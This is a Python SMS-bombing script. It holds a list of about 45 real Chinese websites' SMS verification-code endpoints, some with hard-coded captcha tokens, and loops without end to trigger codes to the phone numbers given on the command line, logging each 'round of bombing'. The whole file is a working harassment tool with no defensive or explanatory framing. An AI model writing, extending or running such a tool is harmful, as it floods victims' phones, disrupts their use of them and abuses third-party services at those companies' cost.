from email import parser
import requests
import json
import time
import random
import urllib.parse
import urllib.request
import argparse
import sys

# post地址 post参数
APIS = [

{
    "desc": "1",
    "url": "https://m.wanzhoumo.com/proxy?api_path=%2Fuser%2Fmobilelogincode&v=3.0&fields_version=3.3&mobile=[phone]",
    "method":"",
    "header":""
},
{
    "desc": "2",
    "url": "https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=1&use_type=1",
    "method":"",
    "header":""
},
{
    "desc": "3",
    "url": "http://user.daojia.com/mobile/getcode?mobile={phone}",
    "method":"",
    "header":""
},
{
    "desc": "4",
    "url": "https://proconsumer.taoche.com/c-usercenter-consumer/user/getCode?mobile={phone}",
    "method":"",
    "header":""
},
{
    "desc": "5",
    "url": "http://uniwechat.saicskoda.com.cn/wxPage/WebHandler.ashx?userid=oeXPu5-_nc6Yr6JmU8vj720WZ6wg&toid=08161&type=sendsms&tel={phone}",
    "method":"",
    "header":""
},
{
    "desc": "6",
    "url": "https://hapi.00bang.cn/llb/oauth/llb/getLoginSmsCode?mobile={phone}",
    "method":"",
    "header":""
},
{
    "desc": "7",
    "url": "https://818ps.com/site-api/send-tel-login-code?num={phone}&codeImg=undefined",
    "method":"",
    "header":""
},
{
    "desc": "8",
    "url": "https://h5.17k.com/ck/user/mobile/{phone}/message?smsType=1&appKey=1351550300",
    "method":"",
    "header":""
},
{
    "desc": "9",
    "url": "http://ershoucheapi.58.com/cheyuan/comm/smsCode.do?callback=jQuery17208815301240499984_1623173514122&phone={phone}&code=send&_=1623173533089",
    "method":"",
    "header":""
},
{
    "desc": "10",
    "url": "https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={phone}",
    "method":"",
    "header":""
},
{
    "desc": "11",
    "url": "https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={phone}",
    "method":"",
    "header":""
},
{
    "desc": "12",
    "url": "https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile={phone}",
    "method":"",
    "header":""
},
{
    "desc": "13",
    "url": "https://api.hetao101.com/login/v2/account/oauth/verifyCode?phoneNumber={phone}",
    "method":"",
    "header":""
},
{
    "desc": "14",
    "url": "https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile={phone}",
    "method":"",
    "header":""
},
{
    "desc": "15",
    "url": "https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=1&use_type=0",
    "method":"",
    "header":""
},
 {
    "desc": "亿邦动力17",
    'url': 'https://m.ebrun.com/auth/send-sms-4-fast-login-mobile?callback=jQuery32103526805717520247_1659538292863&mobile={phone}&geetest_challenge=4e240a52b2dfcec1b98f3b0f2d8df7967u&geetest_validate=85c8e8c228aab350e542da104c3db194&geetest_seccode=85c8e8c228aab350e542da104c3db194%7Cjordan&_=1659538292865'
},
{
    "desc": "好单库18",
    'url': 'http://publish.haodanku.com/Login/sendSmsCode',
    "method": "POST",
    "header": "",
    'data': {
        'phone': '[phone]',
        'type': "1"
    }
},
{
    "desc": "精品库19",
    "method": "POST",
    "header": "",
    'url': 'http://www.jingpinku.com/communal/sms.do',
    'data': {
        'phone': '[phone]','type':'register'
    }
},
{
    "desc": "阿明20",
    "method": "POST",
    "header": "",
    'url': 'https://pdd.amingtool.com/sms/reg',
     'data': {
        'account': '[phone]'
    }
},  
{
    "desc": "网易云游戏21",
    "url": "https://n.cg.163.com/api/v1/phone-captchas/86-[phone]",
    "method": "POST",
    "header": "",
    "data": {
        "etc": {
            "validate": ""
        }
    }
},
{
    "desc": "股海网22",
    "url": "https://www.guhai.com.cn/front/member/sendSmsCode",
    "method": "POST",
    "header": "",
    "data": {
        "mobile": "[phone]"
    }
},
{
    "desc": "问政江西23",
    "url": "https://wenz.jxnews.com.cn/ms/index.php/Home/User/get_yzm",
    "method": "POST",
    "header": "",
    "data": {
        "phone": "[phone]"
    }
},
{
    "desc": "闪德资讯24",
    "url": "https://www.0101ssd.com/user/sendmsg",
    "method": "POST",
    "header": "",
    "data": {
        "mobile": "[phone]",
        "event": "register"
    }
},

{
    "desc": "中科教育25",
    "url": "https://www.vipexam.cn/user/identifyingCode.action",
    "method": "POST",
    "header": "",
    "data": {
        "phone": "[phone]"
    }
},
{
    "desc": "苏州高新区教育局26",
    "url": "https://jssnd.edu.cn/apiu/v1/register/auth",
    "method": "POST",
    "header": "",
    "data": {
        "phone": "[phone]"
    }
},
{
    "desc": "费耘网27",
    "url": "https://www.feeclouds.com/homepage/register/send",
    "method": "POST",
    "header": "",
    "data": {
        "mobile": "[phone]"
    }
},
{
    "desc": "语雀web28",
    "url": "https://www.yuque.com/api/validation_codes",
    "method": "POST",
    "header": {
        "referer": "https://www.yuque.com/register"
    },
    "data": {
        "target": "[phone]",
        "action": "register",
        "channel": "sms"
    }
},
{
    "desc": "网心云APP29",
    "url": "https://account-box.onethingpcs.com/xluser.core.login/v3/sendsms",
    "method": "POST",
    "header": "",
    "data": {
        "protocolVersion": "301",
        "sequenceNo": "1000001",
        "platformVersion": "10",
        "isCompressed": "0",
        "appid": "22017",
        "clientVersion": "3.15.1",
        "peerID": "00000000000000000000000000000000",
        "appName": "ANDROID-com.onethingcloud.android",
        "sdkVersion": "204500",
        "devicesign": "div101.095893e2bfa13a199f83691076c8bbb9ab0d01f75c929975048142c2fa38402b",
        "netWorkType": "WIFI",
        "providerName": "NONE",
        "deviceModel": "M2102J2SC",
        "deviceName": "Xiaomi M2102j2sc",
        "OSVersion": "11",
        "creditkey": "",
        "hl": "zh-CN",
        "mobile": "[phone]",
        "register": "0"
    }
},
{
    "desc": "核桃编程app30",
    "url": "https://api.hetao101.com/login/v2/account/oauth/verifyCode?phoneNumber=[phone]",
    "method": "GET",
    "header": "",
    "data": {
        
    }
},
{
    "desc": "31",
    "url": "https://rsks.class.com.cn/v3/msg/front/commons/getCaptcha?mobile={phone}",
    "method":"",
    "header":"",
    "data": {
    }
},
{
    "desc": "32",
    "url": 'https://cloud.huace.cn/ChcnavCloudAuth/code/sms?mobile={phone}',
    "method":"",
    "header":"",
    "data": {      
    }
},
{
    "desc": "33",
    'url': 'https://xiezuocat.com/verify?type=signup',
    'payload': True,
    "method":"post",
    "header":"",
    'data': {
        'phone': '86-[phone]'
    }
},
{
    "desc": "34",
    'url': "http://www.yhis999.cn/yunhis/register.do?act=lable&type=yzm",
    "method":"post",
    "header":"",
    'data': {
       'lxdh': "[phone]"
    }
},
{
    "desc": "35",
    'url': "https://user.qunar.com/weblogin/sendLoginCode",
    "method":"post",
    "header":"",
    'data': {
       "usersource":"", 
        "source": "",
        "ret": "https://www.qunar.com/",
        "ref": "",
        "business":"", 
        "pid": "",
        "originChannel":"" ,
        "activityCode":"", 
        "mobile": "[phone]",
        "prenum": "86",
        "loginSource": "1",
        "slideToken": "a65a24d1082dd6dd8b886ac5a927d409",
        "smsType": "0",
        "appcode": "register_pc",
        "captchaType":"" 
    }
},
{
    "desc": "36",
    'url': 'http://oa.lehome114.com/action/sendcode',
    "method":"post",
    "header":"",
    'data': {
        "phone":"[phone]"
    }
},
{
    "desc": "37",
    'url': 'https://rest.zhibo.tv/user/send-phone-code?mobile={phone}',
    "method":"",
    "header":"",
    'data': {
    }
},
{
    "desc": "38",
    'url': 'https://cowtransfer.com/api/user/register/mobilesignin?mobile={phone}&joinProToken=',
    "method":"",
    "header":"",
    'data': {
    }
},
{
    "desc": "39",
    'url': 'https://zhishuapi.aldwx.com/Main/action/User_center/Login/sendNum',
    "method":"post",
    "header":"",
    'data': {
				"phone": "[phone]",
                "platform": "2",
                "type":"6",
                "anonymous_id": "182be6bc993795-00d7e597a22b1f88-1b515635-4953600-182be6bc9957fa",
                "token":"", 
                "visit_type": "1"
    }
},
{
    "desc": "大拼客40",
    'url': 'https://www.dapinke.com/register/send-msg',
    "method": "POST",
    "header": "",
    'data': {
        'mobile': '[phone]'
    }
},
{
    "desc": "飞援41",
    'url': 'https://www.freetalen.com/vcode/getVcode?mobile={phone}&type=1',
    "method": "",
    "header": "",
    'data': {
    }
},
{
    "desc": "解放号42",
    'url': 'https://rest.jfh.com/cmm-portal/sms/sendSms?telephone={phone}&validateCode=&token=&type=&_=1661077799882',
    "method": "",
    "header": "",
    'data': {
    }
},
{
    "desc": "威客网43",
    'url': 'https://tool.k68.cn/Safe/Index?callback=doResult&phone={phone}',
    "method": "",
    "header": "",
    'data': {
    }
},
{
    "desc": "接单网44",
    'url': 'https://www.1jiedan.com/api/auth/sendSms',
    "method": "post",
    "header": "",
    'data': {
        "phone": "[phone]"
    }
},
{
    "desc": "UU跑腿45",
    'url': 'https://passportweb.uupt.com/api//?method=sms.send.post',
    "method": "post",
    "header": "",
    'data': {
        "geetest_challenge": "6f4922f45568161a8cdf4ad2299f6d236f",
        "geetest_validate": "bd5c6d2cef77085c6a65ec9c2537f1ac",
        "geetest_seccode": "bd5c6d2cef77085c6a65ec9c2537f1ac|jordan",
        "mobile": "[phone]",
        "type": "4",
        "photoCode":"" 
    }
},
]


def sendSMS(API, phone):
    header = {
        'User-Agent': "Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
    }
    if API.get('header'):
        header.update(API.get('header'))
    
    body = API.get('method')
    
    try:
        if body:
            body = API.get("data")
            print("Post:")
            print(phone)
            url = API.get('url').replace("[phone]", phone).replace("[timestamp]", str(int(time.time() * 1000))).replace("[timestamp1]", str(int(time.time() * 1000)))
            body = eval(str(body).replace("[phone]", phone)) if isinstance(body, dict) else body.replace("[phone]", phone)
            if API.get('payload'):
                body = json.dumps(body)
            print("request")
            r = requests.post(url, body, headers=header)
            print('request over')
        else:
            url = API.get('url').replace("{phone}", phone).replace("[timestamp]", str(int(time.time() * 1000))).replace("[timestamp1]", str(int(time.time() * 1000)))
            print("Get:")
            r = requests.get(url, headers=header)
        print('Status_Code:')
        print(r.status_code)
        print('-----------------------------------------')
        print(url)
        print(phone)
        print('-----------------------------------------')
        #print(r.text)
        print(json.loads(r.text))
    except:
        ...


def main(phone):
    i = 1
    while i > 0:
        for API in APIS:
            sendSMS(API, phone)
            time.sleep(random.randint(1, 3))
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待60秒后，开始第{i + 1}轮轰炸！")
        time.sleep(60)
        i += 1
        

if __name__ == '__main__':
    # 手机号
    phones = sys.argv[1].split(',')
    i=1
    while i > 0:
        for phone in phones:
            #sendSMS(APIS[0], i)
            for API in APIS:
                sendSMS(API, phone)
                #time.sleep(random.randint(1, 3))            
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待60秒后，开始第{i + 1}轮轰炸！")
        time.sleep(3)
        
        i += 1

    #phone = sys.argv[1]
   # phone = '18616202661'
    #sendSMS(APIS[0], phone)
    #main(phone)
